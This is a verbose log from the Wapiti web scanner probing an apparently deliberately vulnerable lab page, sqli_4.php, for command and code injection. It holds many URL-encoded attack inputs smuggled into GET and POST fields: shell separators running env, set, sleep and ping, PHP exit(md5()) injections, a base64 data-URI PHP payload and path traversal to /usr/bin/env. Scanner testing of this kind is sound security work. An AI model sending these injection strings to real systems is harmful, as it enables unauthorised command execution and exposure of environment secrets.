2024-03-20 16:46:10.346 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/sqli_4.php?title=fuzz&action=search (0)
2024-03-20 16:46:20.556 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:46:20.566 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:46:20.575 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:46:20.584 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:46:20.593 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:46:20.605 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (1)
2024-03-20 16:46:20.617 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=a%60%29%60 (1)
2024-03-20 16:46:20.626 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=a%60sleep%2060%60 (1)
2024-03-20 16:46:20.636 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=a%3Bsleep%2060%3B (1)
2024-03-20 16:46:20.644 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=a%7Csleep%2060%3B (1)
2024-03-20 16:46:20.657 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%26ping%20-n%2025%20127.0.0.1%26 (1)
2024-03-20 16:46:20.676 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php (1)
2024-03-20 16:46:20.689 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27
2024-03-20 16:46:20.691 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%3Benv%3B&bug=27
2024-03-20 16:46:20.699 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%7Cenv%7C&bug=27
2024-03-20 16:46:20.708 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=a%3Benv%3B&bug=27
2024-03-20 16:46:20.715 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=a%3Benv%3B&bug=27
2024-03-20 16:46:20.721 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&bug=27
2024-03-20 16:46:20.727 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%3Benv%3B&bug=27
2024-03-20 16:46:20.733 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%0Aenv%3B&bug=27
2024-03-20 16:46:20.739 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%26set%26&bug=27
2024-03-20 16:46:20.745 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=set&bug=27
2024-03-20 16:46:20.752 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=env&bug=27
2024-03-20 16:46:20.758 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%2Fe%00&bug=27
2024-03-20 16:46:20.765 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=27
2024-03-20 16:46:20.771 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=27
2024-03-20 16:46:20.777 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=27
2024-03-20 16:46:20.783 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=27
2024-03-20 16:46:20.790 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=27
2024-03-20 16:46:20.796 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=27
2024-03-20 16:46:20.803 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=27
2024-03-20 16:46:20.808 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=27
2024-03-20 16:46:20.815 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=27
2024-03-20 16:46:20.823 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=27
2024-03-20 16:46:20.829 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=27
2024-03-20 16:46:20.836 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=27
2024-03-20 16:46:20.842 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&bug=27
2024-03-20 16:46:20.848 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=a%60%29%60&bug=27
2024-03-20 16:46:20.855 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=a%60sleep%2060%60&bug=27
2024-03-20 16:46:20.860 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=a%3Bsleep%2060%3B&bug=27
2024-03-20 16:46:20.867 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=a%7Csleep%2060%3B&bug=27
2024-03-20 16:46:20.873 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=%26ping%20-n%2025%20127.0.0.1%26&bug=27
2024-03-20 16:46:20.880 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%3Benv%3B
2024-03-20 16:46:20.887 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%7Cenv%7C
2024-03-20 16:46:20.893 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=a%3Benv%3B
2024-03-20 16:46:20.899 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=a%3Benv%3B
2024-03-20 16:46:20.905 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
2024-03-20 16:46:20.911 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27%3Benv%3B
2024-03-20 16:46:20.919 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27%0Aenv%3B
2024-03-20 16:46:20.924 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%26set%26
2024-03-20 16:46:20.931 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=set
2024-03-20 16:46:20.938 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=env
2024-03-20 16:46:20.943 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%2Fe%00
2024-03-20 16:46:20.950 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:46:20.956 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:46:20.962 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:46:20.969 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:46:20.975 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:46:20.981 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:46:20.988 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:46:20.994 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:46:21.001 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:46:21.007 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:46:21.015 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:46:21.022 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:46:21.030 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
2024-03-20 16:46:21.037 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=a%60%29%60
2024-03-20 16:46:21.044 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=a%60sleep%2060%60
2024-03-20 16:46:21.051 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=a%3Bsleep%2060%3B
2024-03-20 16:46:21.058 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=a%7Csleep%2060%3B
2024-03-20 16:46:21.065 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=%26ping%20-n%2025%20127.0.0.1%26
2024-03-20 16:46:21.079 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=2
2024-03-20 16:46:21.081 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%3Benv%3B&security_level=2
2024-03-20 16:46:21.088 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%7Cenv%7C&security_level=2
2024-03-20 16:46:21.094 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=a%3Benv%3B&security_level=2
2024-03-20 16:46:21.101 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=a%3Benv%3B&security_level=2
2024-03-20 16:46:21.108 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&security_level=2
2024-03-20 16:46:21.115 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit%3Benv%3B&security_level=2
2024-03-20 16:46:21.121 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit%0Aenv%3B&security_level=2
2024-03-20 16:46:21.128 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%26set%26&security_level=2
2024-03-20 16:46:21.134 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=set&security_level=2
2024-03-20 16:46:21.141 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=env&security_level=2
2024-03-20 16:46:21.148 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%2Fe%00&security_level=2
2024-03-20 16:46:21.155 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
2024-03-20 16:46:21.161 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
2024-03-20 16:46:21.168 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
2024-03-20 16:46:21.177 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
2024-03-20 16:46:21.184 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
2024-03-20 16:46:21.191 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
2024-03-20 16:46:21.199 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
2024-03-20 16:46:21.208 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
2024-03-20 16:46:21.215 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
2024-03-20 16:46:21.224 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
2024-03-20 16:46:21.234 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
2024-03-20 16:46:21.244 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
2024-03-20 16:46:21.253 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&security_level=2
2024-03-20 16:46:21.262 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=a%60%29%60&security_level=2
2024-03-20 16:46:21.271 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=a%60sleep%2060%60&security_level=2
2024-03-20 16:46:21.277 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=a%3Bsleep%2060%3B&security_level=2
2024-03-20 16:46:21.284 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=a%7Csleep%2060%3B&security_level=2
2024-03-20 16:46:21.290 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=%26ping%20-n%2025%20127.0.0.1%26&security_level=2
2024-03-20 16:46:21.301 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=%3Benv%3B
2024-03-20 16:46:21.307 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=%7Cenv%7C
2024-03-20 16:46:21.316 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=a%3Benv%3B
2024-03-20 16:46:21.323 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=a%3Benv%3B
2024-03-20 16:46:21.331 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
2024-03-20 16:46:21.338 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=2%3Benv%3B
2024-03-20 16:46:21.346 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=2%0Aenv%3B
2024-03-20 16:46:21.355 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=%26set%26
2024-03-20 16:46:21.361 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=set
2024-03-20 16:46:21.371 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=env
2024-03-20 16:46:21.377 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=%2Fe%00
2024-03-20 16:46:21.385 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:46:21.391 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:46:21.399 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:46:21.405 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:46:21.412 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:46:21.420 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:46:21.426 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:46:21.433 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:46:21.440 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:46:21.447 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:46:21.454 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_4.php (1)
